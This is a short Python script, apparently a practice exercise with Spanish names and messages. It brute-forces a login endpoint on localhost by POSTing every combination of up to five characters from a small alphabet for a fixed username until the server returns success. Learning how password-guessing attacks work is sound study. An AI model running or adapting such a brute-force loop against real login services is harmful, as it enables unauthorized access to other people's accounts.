import time
import requests
from itertools import product 

URL= "http://127.0.0.1:8000/login"
pana = "user1"

def intentar(p):
    datos = {"username": pana, "contrasena": p}
    try:
        r = requests.post(URL, json=datos)
        return r.status_code == 200
    except:
        print("Error de conexoon: ")
        return False

def bruteforce_itertools(alfabeto):
    intentos = 0
    inicio = time.time()

    for largo in range(1, 6): 
        print(f"Buscando combinaciones de {largo} caracteres...")
        for combinacion in product(alfabeto, repeat=largo):
            intentos += 1
            palabra = "".join(combinacion)
            
            if intentar(palabra):
                Tiempo = time.time()
                print(f"\n ¡CONTRASEÑA ENCONTRADA!: {palabra}")
                print(f" Intentos: {intentos} | Tiempo: {Tiempo - inicio:.2f}segundos")
                return palabra
    return None

if __name__== "__main__":
    alfabeto = "abc123"
    print("Iniciando....")
    bruteforce_itertools(alfabeto)
